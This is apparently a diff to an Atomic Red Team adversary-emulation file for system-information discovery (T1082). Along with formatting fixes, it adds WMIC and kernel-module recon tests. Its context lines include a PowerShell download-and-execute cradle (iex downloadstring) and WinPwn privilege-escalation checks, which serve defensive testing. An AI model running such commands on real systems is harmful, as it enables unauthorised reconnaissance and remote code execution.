@@ -33,7 +33,7 @@ atomic_tests:
   input_arguments:
     output_file:
       description: Output file used to store the results.
-      type: Path
+      type: path
       default: /tmp/T1082.txt
   executor:
     command: |
@@ -119,17 +119,17 @@ atomic_tests:
   input_arguments:
     vbscript:
       description: Path to sample script
-      type: String
+      type: string
       default: PathToAtomicsFolder\T1082\src\griffon_recon.vbs
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-       Sample script file must exist on disk at specified location (#{vbscript})
-      prereq_command: |
-        if (Test-Path #{vbscript}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        New-Item -Type Directory (split-path #{vbscript}) -ErrorAction ignore | Out-Null
-        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1082/src/griffon_recon.vbs" -OutFile "#{vbscript}"
+  - description: |
+      Sample script file must exist on disk at specified location (#{vbscript})
+    prereq_command: |
+      if (Test-Path #{vbscript}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path #{vbscript}) -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1082/src/griffon_recon.vbs" -OutFile "#{vbscript}"
   executor:
     command: 'cscript #{vbscript}'
     name: powershell
@@ -167,7 +167,7 @@ atomic_tests:
     name: sh
 - name: WinPwn - winPEAS
   auto_generated_guid: eea1d918-825e-47dd-acc2-814d6c58c0e1
-  description:  Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn
+  description: Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn
   supported_platforms:
   - windows
   executor:
@@ -178,7 +178,7 @@ atomic_tests:
     name: powershell
 - name: WinPwn - itm4nprivesc
   auto_generated_guid: 3d256a2f-5e57-4003-8eb6-64d91b1da7ce
-  description:  Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn
+  description: Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn
   supported_platforms:
   - windows
   executor:
@@ -189,7 +189,7 @@ atomic_tests:
     name: powershell
 - name: WinPwn - Powersploits privesc checks
   auto_generated_guid: 345cb8e4-d2de-4011-a580-619cf5a9e2d7
-  description:  Powersploits privesc checks using oldchecks function of WinPwn
+  description: Powersploits privesc checks using oldchecks function of WinPwn
   supported_platforms:
   - windows
   executor:
@@ -206,7 +206,7 @@ atomic_tests:
     name: powershell
 - name: WinPwn - General privesc checks
   auto_generated_guid: 5b6f39a2-6ec7-4783-a5fd-2c54a55409ed
-  description:  General privesc checks using the otherchecks function of WinPwn
+  description: General privesc checks using the otherchecks function of WinPwn
   supported_platforms:
   - windows
   executor:
@@ -249,7 +249,7 @@ atomic_tests:
       RBCD-Check -consoleoutput -noninteractive
     name: powershell
 
-- name: WinPwn - PowerSharpPack - Watson searching for missing windows patches 
+- name: WinPwn - PowerSharpPack - Watson searching for missing windows patches
   auto_generated_guid: 07b18a66-6304-47d2-bad0-ef421eb2e107
   description: PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn
   supported_platforms:
@@ -269,12 +269,12 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
       Invoke-SharpUp -command "audit"
     name: powershell
-    
-- name: WinPwn - PowerSharpPack - Seatbelt 
+
+- name: WinPwn - PowerSharpPack - Seatbelt
   auto_generated_guid: 5c16ceb4-ba3a-43d7-b848-a13c1f216d95
   description: |-
     PowerSharpPack - Seatbelt technique via function of WinPwn.
-    
+
     [Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.
   supported_platforms:
   - windows
@@ -294,11 +294,11 @@ atomic_tests:
   input_arguments:
     username:
       description: Azure AD username
-      type: String
-      default: null
+      type: string
+      default:
     password:
       description: Azure AD password
-      type: String
+      type: string
       default: T1082Az
   dependency_executor_name: powershell
   dependencies:
@@ -337,11 +337,35 @@ atomic_tests:
 - name: Linux List Kernel Modules
   auto_generated_guid: 034fe21c-3186-49dd-8d5d-128b35f181c7
   description: |
-    Identify kernel modules installed. Upon successful execution stdout will display kernel modules installed on host.
+    Enumerate kernel modules installed 3 different ways. Upon successful execution stdout will display kernel modules installed on host 2 times, followed by list of modules matching 'vmw' if present.
   supported_platforms:
   - linux
   executor:
     command: |
-      sudo lsmod
-      sudo kmod list
+      lsmod
+      kmod list
+      grep vmw /proc/modules
     name: sh
+- name: System Information Discovery with WMIC
+  auto_generated_guid: 8851b73a-3624-4bf7-8704-aa312411565c
+  description: |
+    Identify system information with the WMI command-line (WMIC) utility. Upon execution, various system information will be displayed, including: OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS, and GPU driver products/versions.
+    https://nwgat.ninja/getting-system-information-with-wmic-on-windows/
+    Elements of this test were observed in the wild used by Aurora Stealer in late 2022 and early 2023, as highlighted in public reporting:
+    https://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar
+    https://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      wmic cpu get name
+      wmic MEMPHYSICAL get MaxCapacity
+      wmic baseboard get product
+      wmic baseboard get version
+      wmic bios get SMBIOSBIOSVersion
+      wmic path win32_VideoController get name
+      wmic path win32_VideoController get DriverVersion
+      wmic path win32_VideoController get VideoModeDescription
+      wmic OS get Caption,OSArchitecture,Version
+      wmic DISKDRIVE get Caption
+    name: command_prompt
